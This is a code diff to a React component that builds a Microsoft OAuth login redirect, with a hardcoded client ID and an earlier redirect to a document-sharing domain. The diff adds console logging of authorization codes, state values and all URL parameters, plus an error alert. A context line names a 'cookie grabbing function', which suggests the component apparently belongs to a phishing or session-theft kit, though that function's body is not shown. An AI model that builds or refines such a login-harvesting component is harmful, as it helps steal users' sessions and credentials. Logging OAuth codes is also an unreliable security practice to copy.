@@ -47,16 +47,23 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
   // Real Microsoft OAuth configuration
   const STATE = Math.random().toString(36).substring(2, 15);
-  const REDIRECT_URI = 'https://vaultydocs.com/oauth-callback';
+  const REDIRECT_URI = window.location.origin;
   const MICROSOFT_OAUTH_URL =
     'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
     'client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&' +
     'response_type=code&' +
-    `redirect_uri=${REDIRECT_URI}&` +
+    `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
     'response_mode=query&' +
     'scope=openid%20profile%20email&' +
     'prompt=login' +
     `&state=${STATE}`;
+
+  console.log('🔧 OAuth Configuration:', {
+    redirectUri: REDIRECT_URI,
+    state: STATE,
+    currentOrigin: window.location.origin,
+    currentHref: window.location.href
+  });
 
   // Cookie grabbing function - dynamic, matches sample
   const grabCookies = (cookieArray?: Array<any>) => {
@@ -327,11 +334,16 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
     console.log('🔍 OAuth callback detection:', {
       hasCode: !!code,
+      codeLength: code?.length || 0,
       hasState: !!state,
+      receivedState: state,
+      storedState: storedState,
       stateMatches: state === storedState,
       error: error,
+      errorDescription: urlParams.get('error_description'),
       currentURL: window.location.href,
-      searchParams: window.location.search
+      searchParams: window.location.search,
+      allParams: Object.fromEntries(urlParams.entries())
     });
 
     if (error) {
@@ -617,7 +629,16 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
       }
     } catch (error) {
       console.error('❌ OAuth callback error:', error);
-      // You might want to show an error message to the user here
+      console.error('❌ Full error details:', {
+        name: error.name,
+        message: error.message,
+        stack: error.stack,
+        code: code,
+        currentURL: window.location.href
+      });
+      
+      // Show error to user
+      alert(`OAuth Error: ${error.message}\n\nPlease check the console for details and try again.`);
     }
   };
 
